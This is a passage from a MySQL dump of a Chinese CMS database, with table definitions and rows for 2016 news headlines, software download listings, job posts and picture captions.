,0,0,0,0,0,0,0,0),(128,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0),(129,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0),(130,22,22,22,22,1,1,1,1,0,0,0,0,12,12,12,12,0),(131,17,17,17,17,0,0,0,0,0,0,0,0,15,15,15,15,0),(132,7,7,7,7,2,2,2,2,0,0,0,0,1,1,1,1,0),(140,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0),(141,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `jc_content_count` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_ext`
--

DROP TABLE IF EXISTS `jc_content_ext`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_ext` (
  `content_id` int(11) NOT NULL,
  `title` varchar(150) NOT NULL COMMENT '标题',
  `short_title` varchar(150) DEFAULT NULL COMMENT '简短标题',
  `author` varchar(100) DEFAULT NULL COMMENT '作者',
  `origin` varchar(100) DEFAULT NULL COMMENT '来源',
  `origin_url` varchar(255) DEFAULT NULL COMMENT '来源链接',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `release_date` datetime NOT NULL COMMENT '发布日期',
  `media_path` varchar(255) DEFAULT NULL COMMENT '媒体路径',
  `media_type` varchar(20) DEFAULT NULL COMMENT '媒体类型',
  `title_color` varchar(10) DEFAULT NULL COMMENT '标题颜色',
  `is_bold` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否加粗',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图片',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图片',
  `type_img` varchar(100) DEFAULT NULL COMMENT '类型图片',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '指定模板',
  `need_regenerate` tinyint(1) NOT NULL DEFAULT '1' COMMENT '需要重新生成静态页',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  `toplevel_date` datetime DEFAULT NULL COMMENT '固顶到期日期',
  `pigeonhole_date` datetime DEFAULT NULL COMMENT '归档日期',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_ext_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_ext`
--

LOCK TABLES `jc_content_ext` WRITE;
/*!40000 ALTER TABLE `jc_content_ext` DISABLE KEYS */;
INSERT INTO `jc_content_ext` VALUES (2,'法国尼斯发生汽车冲撞事故 已致75人死上百人伤',NULL,NULL,NULL,NULL,NULL,'2016-07-15 14:47:24',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/15154249ucra.jpg',NULL,NULL,1,NULL,NULL,NULL),(7,'震撼的视角！2016年度无人机摄影大赛佳作大赏',NULL,NULL,NULL,NULL,NULL,'2016-07-15 15:33:26',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/151530033koq.jpg',NULL,NULL,1,NULL,NULL,NULL),(11,'全国28省遭灾 已投入抗洪抢险777万人次','全国28省遭灾 已投入抗洪抢险777万人次',NULL,NULL,NULL,'据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。','2016-07-15 16:23:32',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(12,'习近平就法国尼斯恐袭事件向法总统致慰问电',NULL,NULL,NULL,NULL,'当地时间2016年7月14日，法国国庆日，据法国媒体报道，法国尼斯一辆货车突然冲击人群发动恐怖袭击，据最新消息称，有84人丧生，目前事故原因仍在进一步调查之中。','2016-07-15 17:22:47',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(13,'中国空军航空兵赴南海常态化战斗巡航',NULL,NULL,NULL,NULL,NULL,'2016-07-19 14:12:48',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/19141129f6g4.jpg',NULL,NULL,1,NULL,NULL,NULL),(14,'习近平宁夏考察第一天：长征永远在路上',NULL,NULL,NULL,NULL,'习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮。','2016-07-19 14:26:30',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201607/19142033fu5h.jpg',NULL,NULL,0,'',NULL,NULL),(23,'“十一”黄金周凯里地区文化旅游活动精彩纷呈',NULL,NULL,'黔东南新闻网','http://qdnrbs.cn/htmls/shzh/20160913/137451.html',NULL,'2016-09-13 17:16:04',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(27,'“一带一路”：习近平打开的“筑梦空间”',NULL,NULL,NULL,NULL,'【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”','2016-09-22 16:30:13',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23150119m7z0.jpg',NULL,NULL,1,'',NULL,NULL),(28,'加拿大同意与中国协商引渡条约 转变抵制态度',NULL,NULL,NULL,NULL,'该项目声明，“中国专家将被邀请协助核查不被允许从中国内地来加拿大的人员的身份，”以便将他们遣返回国。','2016-09-22 16:56:46',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/22165418ezkw.jpg',NULL,NULL,1,'',NULL,NULL),(29,'深圳二手房卖主悔约不服判决 纠集60余人冲击法院',NULL,NULL,NULL,NULL,'新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。','2016-09-23 09:07:33',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(30,'不实名手机号停机在即 移动：不对任何社会渠道授权网络售卡',NULL,NULL,NULL,NULL,'中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。','2016-09-23 09:09:41',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(32,'台北故宫将拆除成龙所捐12兽首复制品 成龙回应',NULL,NULL,NULL,NULL,'成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。','2016-09-23 09:19:38',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23091850z61y.jpg',NULL,NULL,1,'',NULL,NULL),(33,'亚马逊股价首破800美元大关 市值稳居全球上市公司第四',NULL,NULL,NULL,NULL,'亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软','2016-09-23 09:23:39',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23092240hxg8.jpg',NULL,NULL,1,'',NULL,NULL),(36,'海银系接盘匹凸匹谜局待解：P2P业务惨淡收场 多次被调查',NULL,NULL,NULL,NULL,'9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。','2016-09-23 09:40:21',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23093922giys.jpg',NULL,NULL,1,'',NULL,NULL),(37,'苹果研发神秘新设备：体积类似Apple TV 支持NFC蓝牙',NULL,NULL,NULL,NULL,'近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。','2016-09-23 09:43:34',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/230942139uh5.jpg',NULL,NULL,1,'',NULL,NULL),(39,'四川理塘县发生4.9级地震 震源深度19千米',NULL,NULL,NULL,NULL,'中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。','2016-09-23 09:54:17',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201609/23095358y6s6.jpg',NULL,NULL,1,'',NULL,NULL),(43,'web前端开发人员',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:33:15',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(44,'asp.net开发工程师',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:34:35',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(45,'文案编辑',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:38:39',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(46,'项目经理',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:45:02',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(47,'3k计算机实习生双休',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:47:54',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(48,'急聘Android开发',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:50:04',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(49,'IT公司招软件工程师助理',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:51:13',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(50,'聘网页前端设计3K双休',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:54:56',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(51,'诚聘微信推广专员',NULL,NULL,NULL,NULL,NULL,'2016-09-26 09:56:01',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(53,'北京天安门广场“祝福祖国”大花篮吊装完毕',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:19:13','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26101908i5ds.jpg',NULL,NULL,1,NULL,NULL,NULL),(55,'墨西哥一油轮失火',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:20:11','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102008qcao.jpg',NULL,NULL,1,NULL,NULL,NULL),(57,'本网记者体验360行之【183】另类“复制”',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:21:19','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102115joze.jpg',NULL,NULL,1,NULL,NULL,NULL),(59,'旅比大熊猫宝宝取名“天宝”',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:22:24','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/261022192w54.jpg',NULL,NULL,1,NULL,NULL,NULL),(61,'莫斯科举办国际灯光节',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:29:06','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26102904f2l8.jpg',NULL,NULL,1,NULL,NULL,NULL),(63,'宇航员拍摄地球夜景：灯火辉煌灿烂 海水平滑如镜',NULL,NULL,NULL,NULL,NULL,'2016-09-26 10:30:05','/u/cms/www/201610/08150638q3zr.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201609/26103003hrib.jpg',NULL,NULL,1,NULL,NULL,NULL),(69,'腾讯QQ',NULL,NULL,NULL,NULL,NULL,'2016-09-26 16:37:28',NULL,NULL,NULL,0,'/u/cms/www/201609/26164039i3uv.jpg','/u/cms/www/201609/261640457r2n.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(71,'百度云管家',NULL,NULL,NULL,NULL,'百度公司推出的一款云服务产品。支持便捷地查看、上传、下载百度云端各类数据。通过百度云管家存入的文件，不会占用本地空间。上传、下载文件过程更稳定。','2016-09-27 09:47:27',NULL,NULL,NULL,0,'/u/cms/www/201609/27095816s3y8.jpg','/u/cms/www/201609/270958122ljv.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(72,'360杀毒 5.0.0.7092 官方正式版','360杀毒',NULL,NULL,NULL,'专业防护，专心为您。\r\n增强敲诈者病毒查杀，最新木马一网打尽;\r\n优化白名单机制，减少打扰;\r\n完善文件实时防护用户体验。','2016-09-27 10:18:46',NULL,NULL,NULL,0,'/u/cms/www/201609/27101524dxj7.jpg','/u/cms/www/201609/27101514u0i9.jpg','/u/cms/www/201609/27101510bh0o.jpg',NULL,NULL,1,'',NULL,NULL),(100,'诺亚传说','诺亚传说',NULL,NULL,NULL,'《诺亚传说》是尚游游戏自主研发的大型角色扮演网游，新资料片《诺亚传说前传-亚特兰蒂斯》火爆发布。','2016-10-10 11:09:06',NULL,NULL,NULL,0,'/u/cms/www/201610/10110634gxcz.jpg','/u/cms/www/201610/10110628vfwz.jpg','/u/cms/www/201610/10110654vib6.jpg',NULL,NULL,1,'',NULL,NULL),(101,'迅雷9',NULL,NULL,NULL,NULL,'迅雷9是“深圳市迅雷网络技术有限公司”于2016年推出的“迅雷”系列下载软件的最新换代产品。迅雷9采用全新下载引擎，对百兆光纤宽带网络环境进行诸多针对性的优化，让用户获得更卓越的下载体验；全新的界面功能布局，承载了更丰富的内容，打造找、下、用的一站式娱乐消费平台。','2016-10-10 11:16:31',NULL,NULL,NULL,0,'/u/cms/www/201610/10111618rhdk.jpg','/u/cms/www/201610/10111549rupn.jpg','/u/cms/www/201610/101116034e14.jpg',NULL,NULL,1,'',NULL,NULL),(102,'360安全卫士',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:19:18',NULL,NULL,NULL,0,'/u/cms/www/201610/101119092w8r.jpg','/u/cms/www/201610/101119026ukx.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(103,'搜狗输入法',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:21:37',NULL,NULL,NULL,0,'/u/cms/www/201610/101120330mpz.jpg','/u/cms/www/201610/10112023kqfp.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(104,'YY语音',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:27:17',NULL,NULL,NULL,0,'/u/cms/www/201610/10112706jiii.jpg','/u/cms/www/201610/10112657zklb.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(105,'阿里旺旺',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:28:52',NULL,NULL,NULL,0,'/u/cms/www/201610/10112845wryq.jpg','/u/cms/www/201610/10112839cvwx.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(106,'爱奇艺视频',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:30:54',NULL,NULL,NULL,0,'/u/cms/www/201610/101130399dbt.jpg','/u/cms/www/201610/10113032zu0k.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(107,'谷歌浏览器',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:32:35',NULL,NULL,NULL,0,'/u/cms/www/201610/10113226knhj.jpg','/u/cms/www/201610/10113218ya2p.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(108,'360浏览器',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:34:05',NULL,NULL,NULL,0,'/u/cms/www/201610/10113400utfn.jpg','/u/cms/www/201610/10113354g71e.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(109,'PPTV聚力',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:35:26',NULL,NULL,NULL,0,'/u/cms/www/201610/1011351336l0.jpg','/u/cms/www/201610/10113506jz07.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(110,'腾讯视频',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:36:32',NULL,NULL,NULL,0,'/u/cms/www/201610/101135560ne4.jpg','/u/cms/www/201610/10113551yru8.jpg',NULL,NULL,NULL,1,'',NULL,NULL),(111,'专访百度科学家徐伟：百度比谷歌的人工智能平台更易上手',NULL,NULL,NULL,NULL,'“开发者在使用时，学习成本较低，这是我们平台易用性的体现。”负责搭建百度深度学习平台PaddlePaddle的百度美国研究院科学家徐伟22日在接受腾讯科技专访时表示。','2016-10-10 11:45:47',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10114452yjhh.jpg',NULL,NULL,1,'',NULL,NULL),(112,'电信诈骗多发产生“蝴蝶效应”虚拟运营商融资受波及',NULL,NULL,NULL,NULL,'自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。','2016-10-10 11:48:08',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10114704dsba.jpg',NULL,NULL,1,'',NULL,NULL),(113,'李克强联合国承诺援助难民：这是责任和道义的担当',NULL,NULL,NULL,NULL,'李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。','2016-10-10 11:50:03',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(114,'科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:11:12',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101308178wzr.jpg',NULL,NULL,1,NULL,NULL,NULL),(115,'四川石渠发现至少30万公顷珍贵泥炭湿地资源',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:15:37',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101314450fs1.jpg',NULL,NULL,1,NULL,NULL,NULL),(116,'全世界最孤独的咖啡馆：海拔4860米 达古冰川之巅',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:19:22',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10131742wzhv.jpg',NULL,NULL,1,NULL,NULL,NULL),(117,'中俄“合作－2016”联合反恐训练圆满结束',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:22:07',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101320442qbi.jpg',NULL,NULL,1,NULL,NULL,NULL),(118,'探访燕城监狱：蔬菜自己种 午餐两菜一汤',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:23:50',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10132253w0rj.jpg',NULL,NULL,1,NULL,NULL,NULL),(119,'摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:26:38',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101326014zdc.jpg',NULL,NULL,1,NULL,NULL,NULL),(120,'宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:35:17',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10133449hwwr.jpg',NULL,NULL,1,NULL,NULL,NULL),(121,'《半妖倾城》爱与恨，追与逃，人与妖再一次掀起一段的惊人的倾城传奇',NULL,NULL,NULL,NULL,'清末，八国联军攻入北京，聂如风带着妻子应蝶和二个女儿躲避追杀，应蝶策马将如风和女儿赶走，独自迎敌，应蝶突然长出雪白的翅膀飞了起来——原来她竟然是妖.','2016-10-10 13:38:11','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/10133842aiyf.png',NULL,'/u/cms/www/201610/10133710to3f.jpg',NULL,NULL,1,NULL,NULL,NULL),(122,'《那年青春我们正好》刘诗诗、种丹妮演绎闺蜜',NULL,NULL,NULL,NULL,'《那年青春我们正好》在浙江卫视、东方卫视热播。种丹妮饰演的韩露“花痴”肖小军（郑恺），与闺蜜刘婷（刘诗诗）同爱一人而“掰面”。','2016-10-10 13:40:05','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/101340004te2.png',NULL,'/u/cms/www/201610/10133954jfoc.jpg',NULL,NULL,1,NULL,NULL,NULL),(123,'《奔跑吧兄弟》收官对决一触即发 邓超被岳云鹏压垮惨叫',NULL,NULL,NULL,NULL,'跑男搭档助阵勇士,力争宇宙最强者称号,究竟“跑男团们都有着怎样神奇的能力？最终谁又将在“助力勇士”的帮助下赢得本季“宇宙最强者”的称号呢？','2016-10-10 13:41:03','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/101340393eav.png',NULL,'/u/cms/www/201610/10134048htcl.jpg',NULL,NULL,1,NULL,NULL,NULL),(124,'李克强出席加拿大总理家宴 小小特鲁多表演后空翻',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:42:48','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134238qppo.jpg',NULL,NULL,1,NULL,NULL,NULL),(125,'习主席和中央军委领导推进军队战斗力建设纪实',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:44:47','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134440wmng.jpg',NULL,NULL,1,NULL,NULL,NULL),(126,'西北第一村白哈巴的早秋',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:01','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101345564pok.jpg',NULL,NULL,1,NULL,NULL,NULL),(127,'美国金秋不止红叶',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:26','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101346227ayf.jpg',NULL,NULL,1,NULL,NULL,NULL),(128,'德国举行南瓜称重比赛 763公斤南瓜获得加冕',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:52','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101346473kic.jpg',NULL,NULL,1,NULL,NULL,NULL),(129,'北京特战队员魔鬼周训练 挑战50项最严苛极限项目',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:47:24','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134720z8a5.jpg',NULL,NULL,1,NULL,NULL,NULL),(130,'党中央推进民族工作创新发展纪实',NULL,NULL,NULL,NULL,'奏响新形势下民族工作新乐章（治国理政新思想新实践）党的十八大以来以习近平同志为总书记的党中央推进民族工作创新发展纪实。','2016-10-10 13:51:07',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(131,'楼市调控应跳出周期性怪圈',NULL,NULL,NULL,NULL,'每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。','2016-10-10 13:54:05',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(132,'黄金接连下跌难道又等大妈来托盘',NULL,NULL,NULL,NULL,'三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。','2016-10-10 13:55:46',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(140,'安卓游戏开发5险1金',NULL,NULL,NULL,NULL,NULL,'2016-10-10 14:27:44',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL),(141,'乌兰布统牧歌秋韵',NULL,NULL,NULL,NULL,NULL,'2016-10-11 09:44:23',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/11093237z5e8.jpg',NULL,NULL,1,NULL,NULL,NULL);
/*!40000 ALTER TABLE `jc_content_ext` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_group_view`
--

DROP TABLE IF EXISTS `jc_content_group_view`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_group_view` (
  `content_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`group_id`),
  KEY `fk_jc_content_group_v` (`group_id`),
  CONSTRAINT `fk_jc_content_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_content_v` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容浏览会员组关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_group_view`
--

LOCK TABLES `jc_content_group_view` WRITE;
/*!40000 ALTER TABLE `jc_content_group_view` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_content_group_view` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_picture`
--

DROP TABLE IF EXISTS `jc_content_picture`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_picture` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `img_path` varchar(100) NOT NULL COMMENT '图片地址',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`content_id`,`priority`),
  CONSTRAINT `fk_jc_picture_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容图片表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_picture`
--

LOCK TABLES `jc_content_picture` WRITE;
/*!40000 ALTER TABLE `jc_content_picture` DISABLE KEYS */;
INSERT INTO `jc_content_picture` VALUES (2,0,'/u/cms/www/201607/15154302mvu4.jpg','当地时间2016年7月5日报道，美国宇航局“朱诺”号探测器成功进入环绕木星轨道，将展开探寻木星起源的任务。'),(2,1,'/u/cms/www/201607/15154338b6h9.jpg','据悉，“朱诺”号将环绕木星运行20个月，收集有关该行星核心的数据，描绘其磁场，并测量大气中水和氨的含量。'),(2,2,'/u/cms/www/201607/15154354xp50.jpg','另外，“朱诺”号还会观察木星表面著名的大红斑，一个持续了数百年的风暴，从而揭示其深层的秘密。'),(2,3,'/u/cms/www/201607/15154421y33m.jpg','美国“朱诺”号探测器成功进入环绕木星轨道'),(7,0,'/u/cms/www/201607/15153012bpfd.jpg','旅行类冠军：浓雾中的意大利阿西西圣弗兰西斯大教堂。摄影：Francesco Cattuto'),(7,1,'/u/cms/www/201607/15153034m1rr.jpg','旅行类亚军：澳大利亚凯布尔海滩上的一队骆驼。摄影：Todd Kennedy'),(7,2,'/u/cms/www/201607/15153052j190.jpg','旅行类季军：大加纳利岛上色彩斑斓的Playa de Amadores海滩。 摄影：Karolis Janulis'),(7,3,'/u/cms/www/201607/15153110yn2c.jpg','自然与野生动物类冠军：丹麦Kalbyris森林。摄影：Michael Bernholdt'),(7,4,'/u/cms/www/201607/15153127qs41.jpg','自然与野生动物类亚军：罗马尼亚Marpod公路旁的一大群羊。摄影：Szabolcs Ignacz'),(7,5,'/u/cms/www/201607/15153212rjvo.jpg','自然与野生动物类季军：留尼旺岛富尔奈斯活火山喷发的壮观景象。摄影：Jonathan Payet'),(7,6,'/u/cms/www/201607/1515325323eh.jpg','体育冒险类冠军：攀登者在美国犹他州莫泊峡谷120米处攀爬。摄影：Max Seigal'),(7,7,'/u/cms/www/201607/15153307441e.jpg','体育冒险类亚军：在哥伦比亚库库塔举行的游泳比赛。摄影：Juan Pablo Bayona'),(7,8,'/u/cms/www/201607/15153321t1g3.jpg','体育冒险类季军：在美国阿拉斯加州科尔多瓦沙滩上玩滑板。摄影：Tj Balon'),(13,0,'/u/cms/www/201607/19141216070j.jpg','7月18日，中国空军新闻发言人申进科大校在北京宣布：中国空军近日组织了航空兵赴南海战斗巡航。这次南海战巡，空军出动轰-6K飞机赴黄岩岛等岛礁附近空域进行了巡航。'),(13,1,'/u/cms/www/201607/19141242pppk.jpg','申进科介绍，中国空军航空兵此次赴南海例行性战斗巡航，紧贴使命任务和实战准备，轰-6K和歼击机、侦察机、空中加油机等遂行战巡任务，以空中侦察、对抗空战和岛礁巡航为主要样式组织行动，达成了战斗巡航目的。\r\n申进科表示：“根据有效履行空军使命任务的需要，空军航空兵赴南海战斗巡航，将继续常态化进行。”'),(114,0,'/u/cms/www/201610/101310383u27.jpg','科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现'),(114,1,'/u/cms/www/201610/101311003aey.jpg','科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现'),(114,2,'/u/cms/www/201610/101311098e8w.jpg','科学家研制“隐身潜水服” 